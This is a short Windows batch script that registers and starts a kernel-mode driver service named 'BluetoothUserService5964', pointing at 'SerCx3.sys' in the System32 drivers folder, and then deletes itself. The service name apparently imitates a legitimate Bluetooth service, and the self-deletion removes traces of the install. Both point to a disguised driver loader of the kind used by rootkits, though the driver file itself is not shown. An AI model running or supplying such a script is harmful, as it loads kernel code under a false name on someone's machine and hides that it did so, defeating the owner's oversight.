@echo off
cd %~dp0
sc create BluetoothUserService5964 binpath=C:\Windows\System32\drivers\SerCx3.sys type=kernel
sc start BluetoothUserService5964
del "%~f0"